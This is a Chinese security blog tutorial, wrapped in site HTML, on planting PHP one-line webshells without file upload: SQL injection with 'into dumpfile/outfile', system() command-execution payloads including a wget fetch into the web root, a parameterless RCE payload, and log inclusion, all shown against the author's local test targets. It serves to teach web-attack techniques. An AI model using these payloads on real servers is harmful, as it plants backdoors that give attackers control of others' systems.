@@ -1,0 +1,207 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>除了文件上传还有哪些方式可以写一句话木马？ | gugugux</title><meta name="keywords" content="特殊姿势,一句话木马"><meta name="author" content="xu"><meta name="copyright" content="xu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一句话木马如果上传到服务器的话，有啥危害学过网络安全的人都知道。但是通常网上流传的方式都是通过文件上传来实现木马上传，实在太过老套，这里就教大家几个新的方式来本地生成一句话木马。(这篇笔记知识带大家入个门，想了解的话还得自己查询资料来学习) 这篇笔记也是有很多跳转内容，看不懂可以尝试看看跳转的博客，他们写的一定是比我更好">
+<meta property="og:type" content="article">
+<meta property="og:title" content="除了文件上传还有哪些方式可以写一句话木马？">
+<meta property="og:url" content="http://example.com/2021/12/20/%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="gugugux">
+<meta property="og:description" content="一句话木马如果上传到服务器的话，有啥危害学过网络安全的人都知道。但是通常网上流传的方式都是通过文件上传来实现木马上传，实在太过老套，这里就教大家几个新的方式来本地生成一句话木马。(这篇笔记知识带大家入个门，想了解的话还得自己查询资料来学习) 这篇笔记也是有很多跳转内容，看不懂可以尝试看看跳转的博客，他们写的一定是比我更好">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/11/xNyj5F.jpg">
+<meta property="article:published_time" content="2021-12-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-11T11:14:10.660Z">
+<meta property="article:author" content="xu">
+<meta property="article:tag" content="特殊姿势">
+<meta property="article:tag" content="一句话木马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/10/11/xNyj5F.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/12/20/%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '除了文件上传还有哪些方式可以写一句话木马？',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-11 19:14:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="gugugux" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/7.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/%E5%85%B3%E4%BA%8E"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li><li><a class="site-page child" href="/butterfly%E4%B8%BB%E9%A2%98"><i class="fa-fw https://github.com/jerryc127/hexo-theme-butterfly/"></i><span> 2</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.ax1x.com/2022/10/11/xNyj5F.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">gugugux</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/%E5%85%B3%E4%BA%8E"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li><li><a class="site-page child" href="/butterfly%E4%B8%BB%E9%A2%98"><i class="fa-fw https://github.com/jerryc127/hexo-theme-butterfly/"></i><span> 2</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">除了文件上传还有哪些方式可以写一句话木马？</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-12-19T16:00:00.000Z" title="Created 2021-12-20 00:00:00">2021-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-10-11T11:14:10.660Z" title="Updated 2022-10-11 19:14:10">2022-10-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="除了文件上传还有哪些方式可以写一句话木马？"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>一句话木马如果上传到服务器的话，有啥危害学过网络安全的人都知道。但是通常网上流传的方式都是通过文件上传来实现木马上传，实在太过老套，这里就教大家几个新的方式来本地生成一句话木马。(这篇笔记知识带大家入个门，想了解的话还得自己查询资料来学习)</p>
+<p>这篇笔记也是有很多跳转内容，看不懂可以尝试看看跳转的博客，他们写的一定是比我更好</p>
+<span id="more"></span>
+<h2 id="结合sql注入生成一句话木马"><a href="#结合sql注入生成一句话木马" class="headerlink" title="结合sql注入生成一句话木马"></a>结合sql注入生成一句话木马</h2><p>讲这之前得先介绍mysql配置文件中的<strong>secure_file_priv</strong>选项</p>
+<h3 id="secure-file-priv配置"><a href="#secure-file-priv配置" class="headerlink" title="secure_file_priv配置"></a>secure_file_priv配置</h3><ul>
+<li>secure_file_priv为null    表示不允许导入导出 （5.7后为默认值）</li>
+<li>secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹</li>
+<li>secure_file_priv没有设置时，则表示没有任何限制</li>
+</ul>
+<p>配置文件的位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在windos下</span><br><span class="line"></span><br><span class="line">mysql.ini的[mysqld]下添加</span><br><span class="line"></span><br><span class="line">在linux下</span><br><span class="line"></span><br><span class="line">/etc/my.cnf的[mysqld]下添加</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，这个配置一旦打开，我们就能够通过sql语句来实现生成文件功能了</p>
+<p>接下来就是重点介绍生成文件的两个mysql语法了</p>
+<h3 id="into-dumpfile"><a href="#into-dumpfile" class="headerlink" title="into dumpfile"></a>into dumpfile</h3><p>这个语法的作用就是用于自定义写shell文件<br>例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot; into dumpfile &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\html\\one\\shell.php&#x27;</span><br></pre></td></tr></table></figure>
+<p>into dumpfile后面只能跟绝对路径。</p>
+<p>这里我准备了一个实例给大家</p>
+<p><img src="https://img-blog.csdnimg.cn/532b09628fcd4d318f3a34379223ba8c.png" alt="在这里插入图片描述"></p>
+<p>这就是一个简单的整型注入。主要是用于演示，所以就没有进行任何过滤。</p>
+<p>在他后端的代码则是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select Name <span class="keyword">from</span> name where Id = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<p> 那么我们开始注入了，直接制造以下payload<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select  &quot;&lt;?php eval($_POST[shell]);?&gt;&quot; into dumpfile &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\html\\one\\shell.php&#x27;</span><br></pre></td></tr></table></figure><br>我想把一句话木马就上传在one目录下，所以我的绝对路径如下，在写绝对路径时，’\‘被默认为转义字符，得再来一个\符号给他转义回路径的意思，所以我们路径中是’\\‘<br><img src="https://img-blog.csdnimg.cn/b346c51d62c54816983b6f4d94fee529.png" alt="在这里插入图片描述"><br>等我按下提交后，可以看到原本的目录下面多了一个shell.php,这时候就可以连接蚁剑了</p>
+<p><img src="https://img-blog.csdnimg.cn/f83a36aee4534163865c7bf72d263991.png" alt="在这里插入图片描述"><br>这个语法比较难的操控的地方就是不知道后面的绝对路径跟啥，由于我这是在本地测试，所以知道网页的目录在哪儿。但是假如说是linux系统的话，我们可以尝试var&#x2F;www&#x2F;html这个默认路径</p>
+<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p>该函数同样也是写入文件，因为一些细微的差别，这个函数常用的方法是把数据库中的某个表的内容写入到文件，然后再读取这个文件</p>
+<p>所以我们正常操作流程是先创建一个表，然后利用Insert into 把一句话木马插入进去，然后再导出<br>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test into outfile &#x27;/tmp/test.txt&#x27;</span><br></pre></td></tr></table></figure>
+<p>用法和into dumpfile相似但是又细微的差别</p>
+<p>这里我同样是给大家演示一下，简单给大家看一下读取文件的流程(就不演示向表内写入一句话木马再读取了)<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 union select Id from name where 1=1 into outfile &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\html\\one\\test.txt&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里可以看到one目录下多了一个test.txt，并且里面的内容就是我们的id，至于这个张三，是我们输入的$_GET[‘Id’] &#x3D;1 的回显</p>
+<p>想去掉这个张三只需要 id &#x3D;-1 再union<br><img src="https://img-blog.csdnimg.cn/3d14c76071a8446581de5fc09904d38b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_14,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>接着就可以在我们的url后面访问test.txt文件了，这里面中文字符张三无法显示</p>
+<p><img src="https://img-blog.csdnimg.cn/f931ae20d59147cd820091ec7a1c6303.png" alt="在这里插入图片描述"></p>
+<p>这里还得说一点，在注入的时候，我只是select Id from name into outfile ‘xxxx’，并没有select * 是由原因的</p>
+<p>原因就在于我后端是slect Name 只选择一个字段，后面再union 时也只能选择一个字段，要是select *的话，内含Name 和 Id两个字段就会报错</p>
+<p>然后关于这俩语法我就讲到这儿，还有其他读取文件的语法，以及这俩语法有细微的差别。下面是我学习的别人的笔记，写的<strong>真的很好</strong>，大家看不懂我的可以尝试去它的博客看看<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/archive/2021/02/14/14403017.html">Mysql注入 利用系统读、写文件</a></p>
+<h2 id="RCE利用system函数实现本地生成一句话木马"><a href="#RCE利用system函数实现本地生成一句话木马" class="headerlink" title="RCE利用system函数实现本地生成一句话木马"></a>RCE利用system函数实现本地生成一句话木马</h2><p>当大家看到这个标题的时候就应该懂了怎样实现生成一句话木马了，原理也很简单。先给大家展示以下Payloda</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">\\windos</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;&lt;?php @eval(/$_POST[shell]);?&gt;&quot;&gt;&gt;shell.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\linux</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;wget httpp://xxx/xxx -P /var/www/html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[shell]);?&gt;&#x27;</span> &gt; /home/web/www/PREFIX/htdocs/shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个的话就是考察大家对系统命令的了解程度了<br>利用system，我们就可以实现不需要对方的本地目录也能生成一句话木马的效果</p>
+<p> 就如上面windos的Paylod，生成的一句话木马就是再当前网页的目录，直接读取，蚁剑连接就行。<br> 也可以指定目录，像linux那样，加一个-P就能指定目录了。不想指定把-P去掉就行</p>
+<p>然后也是给大家搭了一个简单的靶场看看<br><img src="https://img-blog.csdnimg.cn/23e910a0080f4996a2cc78949917ef49.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>报错大家不用理会，是因为code里面没有传参所以报错。</p>
+<p>这里就是一个简单的无参数RCE，至于无参数RCE怎么做我就不说了，大家自己了解吧。这里我重点讲一下如何生成一句话木马</p>
+<p>首先Payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;echo &quot;&lt;?php @eval($_POST[shell]);?&gt;&quot;&gt;&gt;shell.php&#x27;);</span><br></pre></td></tr></table></figure>
+<p>先说说啥意思，下面这段的意思就是可以把b里面的传参读取，并echo。那我们就可以使用system了，具体含义大家学习一下<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">无参数RCE绕过</a>就能理解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;b=</span><br></pre></td></tr></table></figure>
+<p>那么b中放的变量就是我们的system(‘echo “<?php @eval($_POST[shell]);?>“&gt;&gt;shell.php’);</p>
+<p>这样他就会在当前目录下生成一个shell.php<br><img src="https://img-blog.csdnimg.cn/9b5a82d4cabe4f28b7bcbad81e1a6d48.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>不仅是无参数RCE，RCE里面用于绕过的那一套在这上面同样实用，比如system这个函数经常被过滤，那么在做RCE时我们不常有好几个system的替代函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system替代函数</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_popen()</span><br><span class="line">passthru()</span><br></pre></td></tr></table></figure>
+<p>原理也是很简单就是利用system嘛，再结合RCE的知识灵活运用</p>
+<h2 id="日志包含写一句话木马"><a href="#日志包含写一句话木马" class="headerlink" title="日志包含写一句话木马"></a>日志包含写一句话木马</h2><p>这个可以说特别常见了，刚开始入门学web安全时，做CTF题基本都会遇到</p>
+<p>原理就是一个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/guoqingsentou/p/13695449.html">本地文件包含漏洞</a></p>
+<p>注意：需要开启服务器记录日志功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">访问日志的位置和文件名在不同的系统上会有所差异</span><br><span class="line"></span><br><span class="line">apache一般是/var/log/apache/access.log。：</span><br><span class="line"></span><br><span class="line">nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>当我们看到include函数的时候，可以下意识的去尝试本地包含以下日志文件，看看能不能行得通。加入能包含日志文件，就可以观察日志信息，然后进行相关的注入</p>
+<p>具体操作方法可以看我之前写的一篇<a target="_blank" rel="noopener" href="https://www.gugugux.com.cn/2021/09/16/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">日志包含漏洞写一句话木马</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总而言之，这些五七八门的方法特别多，重点是学会了可以灵活运用，会运用了，mysql 和RCE也能写一句话木马，包括其他漏洞也时，也能结合起来，这样才是真正的做到理解</p>
+<p>参考链接:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/archive/2021/02/14/14403017.html">Mysql注入 利用系统读、写文件</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">无参数RCE绕过</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/guoqingsentou/p/13695449.html">本地文件包含漏洞</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">xu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/20/%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">http://example.com/2021/12/20/%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%89%B9%E6%AE%8A%E5%A7%BF%E5%8A%BF/">特殊姿势</a><a class="post-meta__tags" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2022/10/11/xNyj5F.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/11/Breakout/"><img class="prev-cover" src="https://s1.ax1x.com/2022/10/11/xNyNB6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">vulnhub-Breakout</div></div></a></div><div class="next-post pull-right"><a href="/2021/11/06/http%E8%B5%B0%E7%A7%81/"><img class="next-cover" src="https://s1.ax1x.com/2022/10/11/xNyh4g.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">http走私漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/11/06/http%E8%B5%B0%E7%A7%81/" title="http走私漏洞"><img class="cover" src="https://s1.ax1x.com/2022/10/11/xNyh4g.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-06</div><div class="title">http走私漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%90%88sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%88%90%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">结合sql注入生成一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#secure-file-priv%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">secure_file_priv配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#into-dumpfile"><span class="toc-number">1.2.</span> <span class="toc-text">into dumpfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#into-outfile"><span class="toc-number">1.3.</span> <span class="toc-text">into outfile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE%E5%88%A9%E7%94%A8system%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E7%94%9F%E6%88%90%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">RCE利用system函数实现本地生成一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">日志包含写一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By xu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script 